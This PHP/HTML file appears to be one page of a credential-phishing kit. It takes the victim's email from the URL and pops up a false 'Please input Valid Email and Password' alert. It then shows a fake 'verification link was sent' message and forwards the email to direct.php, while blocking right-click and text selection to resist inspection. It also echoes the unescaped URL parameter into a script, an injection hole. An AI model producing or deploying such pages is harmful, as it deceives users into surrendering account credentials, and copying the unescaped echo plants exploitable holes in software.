<?php
$email = $_GET['email'];
$linkdirect = "direct.php?id=".$email;
?>
<script> alert('Please input Valid Email and Password.')</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<HTML>
<HEAD><TITLE>Loading... </TITLE>

</HEAD>

<BODY text=#UUUUUU bgColor=#FFFFFF oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<DIV id=splashcontainer style="WIDTH:350px; POSITION: absolute"></DIV><LAYER

id=splashcontainerns width="450"></LAYER>

<font face="Arial" size="18">

<SCRIPT>



var preloadimages=new Array(":abstract.simplenet.com/point.gif","abstract.simplenet.com/point2.html")



var intervals=3000

//configure destination URL

var targetdestination="<?php echo $linkdirect; ?>"





var splashmessage=new Array()

var openingtags='<font face="BANK GOTHIC" size="3">'

splashmessage[0]='verification link was sent to your email, login your email account to complete process.'




var closingtags='</font>'



//Do not edit below this line (besides HTML code at the very bottom)



var i=0



var ns4=document.layers?1:0

var ie4=document.all?1:0

var ns6=document.getElementById&&!document.all?1:0

var theimages=new Array()



//preload images

if (document.images){

for (p=0;p<preloadimages.length;p++){

theimages[p]=new Image()

theimages[p].src=preloadimages[p]

}

}



function displaysplash(){

if (i<splashmessage.length){

sc_cross.style.visibility="hidden"

sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'

sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2

sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2

sc_cross.style.visibility="visible"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash()",intervals)

}



function displaysplash_ns(){

if (i<splashmessage.length){

sc_ns.visibility="hide"

sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')

sc_ns.document.close()



sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2

sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2



sc_ns.visibility="show"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash_ns()",intervals)

}







function positionsplashcontainer(){

if (ie4||ns6){

sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer

displaysplash()

}

else if (ns4){

sc_ns=document.splashcontainerns

sc_ns.visibility="show"

displaysplash_ns()

}

else

window.location=targetdestination

}

window.onload=positionsplashcontainer



</SCRIPT>



</font>



<DIV align=right> </DIV>

<SCRIPT><!--

 var jv=1.0;

//--></SCRIPT>



<SCRIPT language=Javascript1.1><!--

 jv=1.1;

//--></SCRIPT>



<SCRIPT language=Javascript1.2><!--

 jv=1.2;

//--></SCRIPT>



<SCRIPT language=Javascript1.3><!--

 jv=1.3;

//--></SCRIPT>



<SCRIPT language=Javascript1.4><!--

 jv=1.4;

//--></SCRIPT>





<NOSCRIPT><IMG height=1 src="#"

width=1></NOSCRIPT>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center"><img src="load.gif" width="66" height="66" /></p>

</BODY>

</HTML>